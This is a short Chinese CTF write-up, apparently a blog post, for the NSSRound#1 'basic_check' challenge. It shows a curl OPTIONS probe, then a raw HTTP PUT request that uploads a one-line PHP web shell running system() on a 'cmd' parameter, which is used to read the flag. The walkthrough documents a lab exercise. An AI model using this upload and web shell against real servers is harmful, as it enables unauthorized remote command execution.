# 【NSSRound#1 Basic】basic_check


# [NSSRound#1 Basic]basic_check

## 思路
* 一来就是一句让我自己找

  ```
   &lt;?php highlight_file(__FILE__);// Welcome to NSSCTF Round#1 Basic, have fun. 
  ```

* dirsearch 啥也没有，爆破路径没有办法

* 剩下就考虑相应的数据包有没有可疑的东西，也未发现

* 查找看到有师傅使用了OPTIONS方法这让我想起来开发的预检请求，用于检测服务器允许的http方法

  `-I`参数：向服务器发出 HEAD 请求，然会将服务器返回的 HTTP 标头打印出来。
  `-x`参数：指定 HTTP 请求的代理

  ```
  curl -I -X OPTIONS &#34;http://node4.anna.nssctf.cn:28059/index.php&#34;
  ```

  &gt; 但是有个问题是在搞的时候不知道为啥如果不加index.php就无法出方法，待考证原因

* 发现有PUT方法在里面

  PUT、DELETE请求本身最初是用来进行文件管理的

  **如果为进行鉴权处理的话就会任意执行修改和删除**

  在这里我们用这个来传一个文件来执行system命令，或者一句话木马都行。这里使用了执行system命令

  ```
  PUT /f1.php HTTP/1.1
  Host: node4.anna.nssctf.cn:28059
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
  Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
  Accept-Encoding: gzip, deflate
  Connection: close
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i
  Content-Length: 32
  
  &lt;?php
  system($_GET[&#39;cmd&#39;]);
  ?&gt;
  ```

  传入一个f1.php文件，内容为：

  ```
  &lt;?php
  system($_GET[&#39;cmd&#39;]);
  ?&gt;
  ```

* 执行命令`cat /flag`得flag


## 总结
* HTTP协议
* 中间件攻击

---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2024%E5%81%9A%E9%A2%98-nssround%231-basicbasic_check/  

